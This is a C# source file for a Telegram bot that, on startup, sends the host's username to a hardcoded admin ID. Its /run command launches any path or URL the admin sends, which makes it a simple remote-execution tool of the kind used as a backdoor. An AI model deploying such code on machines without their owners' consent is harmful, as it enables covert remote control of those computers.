using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;

namespace TelegramBot_Example
{
    class Program
    {
        static int AdminId { get; set; } = 239678169;
        static string Token { get; set; } = "";
        static List<BotCommand> commands { get; set; } = new List<BotCommand>();

        static TelegramBotClient Bot;

        static void Main(string[] args)
        {
            Bot = new TelegramBotClient(Token);

            commands.Add(new BotCommand
            {
                Command = "/start",
                CountArgs = 0,
                Example = "/start",
                Execute = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Привет, автор бота BashkaMen.\n" +
                        "Вот список всех команд:\n" +
                        string.Join("\n", commands.Select(s => s.Example)) + "\nИ клавиатура для быстрого набора команд без параметров.");

                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Не верное кол-во агрументов\nИспользуйте команду так: /start");
                }
            });

            commands.Add(new BotCommand
            {
                Command = "/help",
                CountArgs = 0,
                Example = "/help",
                Execute = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, string.Join("\n", commands.Select(s=> s.Example)));
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Не верное кол-во агрументов\nИспользуйте команду так: /help");
                }

            });

          

            commands.Add(new BotCommand
            {
                Command = "/run",
                CountArgs = 2,
                Example = "/run [path|url] [visible:bool]",
                Execute = async (model, update) =>
                {
                    try
                    {
                        Process.Start(model.Args.FirstOrDefault());
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Задание выполненно!");
                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Возникла ошибка: " + ex.Message);
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Не верное кол-во агрументов\nИспользуйте команду так: /run [path|url] [visible:bool]");
                }
            });

            Run().Wait();

            Console.ReadKey();
        }


        static async Task Run()
        {
            await Bot.SendTextMessageAsync(AdminId, $"Запущен бот: {Environment.UserName}");

            var offset = 0;

            while (true)
            {
                var updates = await Bot.GetUpdatesAsync(offset);

                foreach (var update in updates)
                {
                    if (update.Message.From.Id == AdminId)
                    {
                        if (update.Message.Type == MessageType.Text)
                        {
                            var model = BotCommand.Parse(update.Message.Text);

                            if (model != null)
                            {
                                foreach (var cmd in commands)
                                {
                                    if (cmd.Command == model.Command)
                                    {
                                        if (cmd.CountArgs == model.Args.Length)
                                        {
                                            cmd.Execute?.Invoke(model, update);
                                        }
                                        else
                                        {
                                            cmd.OnError?.Invoke(model, update);
                                        }
                                    }
                                }
                            }
                            else
                            {
                                await Bot.SendTextMessageAsync(update.Message.From.Id, "Это не команда\nДля просмотра списка команд введите /help");
                            }
                        }
                    }
                    else
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Я создан только для своего хозяина!");
                    }
                    offset = update.Id + 1;
                }

                Task.Delay(500).Wait();
            }
        }

      
    }
}
